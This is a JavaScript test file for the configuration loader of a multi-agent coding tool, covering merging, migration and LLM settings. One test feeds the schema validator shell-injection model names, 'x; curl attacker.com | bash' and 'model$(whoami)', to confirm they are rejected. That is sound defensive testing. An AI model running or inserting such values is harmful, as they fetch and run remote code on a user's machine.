import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";

import {
  CoderConfigSchema,
  deepMerge,
  loadConfig,
  migrateConfig,
  resolveConfig,
  resolvePpcommitLlm,
  userConfigDir,
  userConfigPath,
} from "../src/config.js";

test("deepMerge: arrays replace, not concat", () => {
  const base = { items: [1, 2, 3] };
  const override = { items: [4, 5] };
  const result = deepMerge(base, override);
  assert.deepEqual(result, { items: [4, 5] });
});

test("deepMerge: null values override", () => {
  const base = { a: { b: 1 } };
  const override = { a: null };
  const result = deepMerge(base, override);
  assert.equal(result.a, null);
});

test("deepMerge: undefined values are skipped", () => {
  const base = { a: 1, b: 2 };
  const override = { a: undefined, b: 3 };
  const result = deepMerge(base, override);
  assert.deepEqual(result, { a: 1, b: 3 });
});

test("loadConfig: no files returns all defaults", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = loadConfig(dir);
  const defaults = CoderConfigSchema.parse({});
  assert.deepEqual(config, defaults);
});

test("loadConfig: user config only merges with defaults (old flat format migrated)", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const xdg = mkdtempSync(path.join(os.tmpdir(), "coder-xdg-"));
  mkdirSync(path.join(xdg, "coder"), { recursive: true });
  writeFileSync(
    path.join(xdg, "coder", "config.json"),
    JSON.stringify({
      verbose: true,
      models: { claude: "claude-sonnet-4-5-20250929" },
    }),
  );

  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = xdg;
  try {
    const config = loadConfig(dir);
    assert.equal(config.verbose, true);
    assert.equal(config.models.claude.model, "claude-sonnet-4-5-20250929");
    assert.equal(config.models.gemini.model, "gemini-3-flash-preview"); // default preserved
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("loadConfig: repo config overrides user config", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const xdg = mkdtempSync(path.join(os.tmpdir(), "coder-xdg-"));
  mkdirSync(path.join(xdg, "coder"), { recursive: true });
  writeFileSync(
    path.join(xdg, "coder", "config.json"),
    JSON.stringify({ ppcommit: { blockTodos: false }, verbose: true }),
  );
  writeFileSync(
    path.join(dir, "coder.json"),
    JSON.stringify({ ppcommit: { blockTodos: true }, verbose: false }),
  );

  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = xdg;
  try {
    const config = loadConfig(dir);
    assert.equal(config.ppcommit.blockTodos, true); // repo wins
    assert.equal(config.verbose, false); // repo wins
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("resolveConfig: CLI overrides win over all", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  writeFileSync(
    path.join(dir, "coder.json"),
    JSON.stringify({ verbose: false }),
  );
  const config = resolveConfig(dir, { verbose: true });
  assert.equal(config.verbose, true);
});

test("resolveConfig: deep overrides merge correctly", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, { test: { command: "npm test" } });
  assert.equal(config.test.command, "npm test");
  assert.equal(config.test.timeoutMs, 600000); // default preserved
});

test("resolveConfig: workflow agent roles can be overridden", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, {
    workflow: {
      agentRoles: {
        planner: "codex",
        programmer: "codex",
        reviewer: "claude",
      },
    },
  });
  assert.equal(config.workflow.agentRoles.issueSelector, "gemini");
  assert.equal(config.workflow.agentRoles.planner, "codex");
  assert.equal(config.workflow.agentRoles.programmer, "codex");
  assert.equal(config.workflow.agentRoles.reviewer, "claude");
  assert.equal(config.workflow.wip.push, true);
  assert.equal(config.workflow.wip.autoCommit, true);
  assert.equal(config.workflow.scratchpad.sqliteSync, true);
});

test("resolveConfig: workflow durability settings can be overridden", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, {
    workflow: {
      wip: {
        push: true,
        autoCommit: false,
        includeUntracked: true,
        remote: "backup",
      },
      scratchpad: {
        sqliteSync: true,
        sqlitePath: ".coder/custom-state.db",
      },
    },
  });
  assert.equal(config.workflow.wip.push, true);
  assert.equal(config.workflow.wip.autoCommit, false);
  assert.equal(config.workflow.wip.includeUntracked, true);
  assert.equal(config.workflow.wip.remote, "backup");
  assert.equal(config.workflow.scratchpad.sqlitePath, ".coder/custom-state.db");
});

test("resolveConfig: ppcommit llm settings can be overridden", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, {
    ppcommit: {
      enableLlm: false,
      llmModelRef: "claude",
      llmServiceUrl: "https://example.com/v1",
    },
  });
  assert.equal(config.ppcommit.enableLlm, false);
  assert.equal(config.ppcommit.llmModelRef, "claude");
  assert.equal(config.ppcommit.llmServiceUrl, "https://example.com/v1");
});

test("userConfigPath: respects XDG_CONFIG_HOME", () => {
  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = "/custom/config";
  try {
    assert.equal(userConfigPath(), "/custom/config/coder/config.json");
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("userConfigDir: respects XDG_CONFIG_HOME", () => {
  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = "/custom/config";
  try {
    assert.equal(userConfigDir(), "/custom/config/coder");
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("userConfigPath: falls back to ~/.config", () => {
  const origXdg = process.env.XDG_CONFIG_HOME;
  delete process.env.XDG_CONFIG_HOME;
  try {
    const expected = path.join(os.homedir(), ".config", "coder", "config.json");
    assert.equal(userConfigPath(), expected);
  } finally {
    if (origXdg !== undefined) process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("CoderConfigSchema rejects model names with shell injection characters", () => {
  assert.throws(
    () =>
      CoderConfigSchema.parse({
        models: { gemini: { model: "x; curl attacker.com | bash" } },
      }),
    /Invalid model name/,
  );
  assert.throws(
    () =>
      CoderConfigSchema.parse({
        models: { claude: { model: "model$(whoami)" } },
      }),
    /Invalid model name/,
  );
  // Valid model names should pass
  const parsed = CoderConfigSchema.parse({
    models: {
      gemini: { model: "gemini-2.5-flash" },
      claude: { model: "claude-opus-4-6" },
    },
  });
  assert.equal(parsed.models.gemini.model, "gemini-2.5-flash");
  assert.equal(parsed.models.claude.model, "claude-opus-4-6");
});

test("CoderConfigSchema accepts model names with slashes and dots", () => {
  const parsed = CoderConfigSchema.parse({
    models: { gemini: { model: "models/gemini-2.5-flash-preview" } },
  });
  assert.equal(parsed.models.gemini.model, "models/gemini-2.5-flash-preview");
});

test("migrateConfig: old flat model strings become structured objects", () => {
  const old = {
    models: {
      gemini: "gemini-2.5-flash",
      geminiPreview: "gemini-3-flash-preview",
      claude: "claude-opus-4-6",
    },
  };
  const migrated = migrateConfig(old);
  assert.deepEqual(migrated.models.gemini, { model: "gemini-2.5-flash" });
  assert.deepEqual(migrated.models.claude, { model: "claude-opus-4-6" });
  assert.equal(migrated.models.geminiPreview, undefined);
});

test("migrateConfig: agents endpoints move into models", () => {
  const old = {
    models: { gemini: "gemini-2.5-flash" },
    agents: {
      preferApi: false,
      geminiApiEndpoint: "https://custom-gemini.example.com/v1beta",
      anthropicApiEndpoint: "https://custom-anthropic.example.com",
    },
  };
  const migrated = migrateConfig(old);
  assert.equal(migrated.agents, undefined);
  assert.equal(
    migrated.models.gemini.apiEndpoint,
    "https://custom-gemini.example.com/v1beta",
  );
  assert.equal(
    migrated.models.claude.apiEndpoint,
    "https://custom-anthropic.example.com",
  );
});

test("migrateConfig: ppcommit llmModel and llmApiKeyEnv are removed", () => {
  const old = {
    ppcommit: {
      enableLlm: true,
      llmModel: "gemini-3-flash-preview",
      llmApiKeyEnv: "GEMINI_API_KEY",
      llmServiceUrl: "https://example.com/v1/openai",
    },
  };
  const migrated = migrateConfig(old);
  assert.equal(migrated.ppcommit.llmModel, undefined);
  assert.equal(migrated.ppcommit.llmApiKeyEnv, undefined);
  assert.equal(migrated.ppcommit.enableLlm, true);
  assert.equal(
    migrated.ppcommit.llmServiceUrl,
    "https://example.com/v1/openai",
  );
});

test("migrateConfig: already-structured config passes through", () => {
  const current = {
    models: {
      gemini: {
        model: "gemini-2.5-flash",
        apiEndpoint: "https://generativelanguage.googleapis.com/v1beta",
        apiKeyEnv: "GEMINI_API_KEY",
      },
    },
  };
  const migrated = migrateConfig(current);
  assert.deepEqual(migrated.models.gemini, current.models.gemini);
});

test("resolvePpcommitLlm: derives fields from models config", () => {
  const config = CoderConfigSchema.parse({});
  const resolved = resolvePpcommitLlm(config);
  assert.equal(resolved.enableLlm, true);
  assert.equal(resolved.llmModel, "gemini-3-flash-preview");
  assert.equal(resolved.llmApiKeyEnv, "GEMINI_API_KEY");
  assert.equal(
    resolved.llmServiceUrl,
    "https://generativelanguage.googleapis.com/v1beta/openai",
  );
  assert.equal(resolved.llmApiKey, "");
});

test("resolvePpcommitLlm: respects llmModelRef=claude", () => {
  const config = CoderConfigSchema.parse({
    ppcommit: { llmModelRef: "claude" },
  });
  const resolved = resolvePpcommitLlm(config);
  assert.equal(resolved.llmModel, "claude-sonnet-4-6");
  assert.equal(resolved.llmApiKeyEnv, "ANTHROPIC_API_KEY");
  assert.equal(resolved.llmServiceUrl, "");
});

test("resolvePpcommitLlm: respects llmModelRef=codex", () => {
  const config = CoderConfigSchema.parse({
    ppcommit: { llmModelRef: "codex" },
  });
  const resolved = resolvePpcommitLlm(config);
  assert.equal(resolved.llmModel, "gpt-5.3-codex");
  assert.equal(resolved.llmApiKeyEnv, "OPENAI_API_KEY");
  assert.equal(resolved.llmServiceUrl, "https://api.openai.com/v1");
});

test("resolvePpcommitLlm: llmServiceUrl override wins over derived", () => {
  const config = CoderConfigSchema.parse({
    ppcommit: { llmServiceUrl: "https://custom.example.com/v1/openai" },
  });
  const resolved = resolvePpcommitLlm(config);
  assert.equal(resolved.llmServiceUrl, "https://custom.example.com/v1/openai");
});

test("loadConfig: old flat format is migrated transparently", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  writeFileSync(
    path.join(dir, "coder.json"),
    JSON.stringify({
      models: {
        gemini: "gemini-2.5-flash",
        geminiPreview: "gemini-3-flash-preview",
        claude: "claude-opus-4-6",
      },
      agents: {
        preferApi: false,
        geminiApiEndpoint: "https://custom.example.com/v1beta",
      },
      ppcommit: {
        llmModel: "gemini-3-flash-preview",
        llmApiKeyEnv: "GEMINI_API_KEY",
      },
    }),
  );
  const config = loadConfig(dir);
  assert.equal(config.models.gemini.model, "gemini-2.5-flash");
  assert.equal(
    config.models.gemini.apiEndpoint,
    "https://custom.example.com/v1beta",
  );
  assert.equal(config.models.claude.model, "claude-opus-4-6");
  assert.equal(config.agents, undefined);
  assert.equal(config.ppcommit.llmModel, undefined);
});
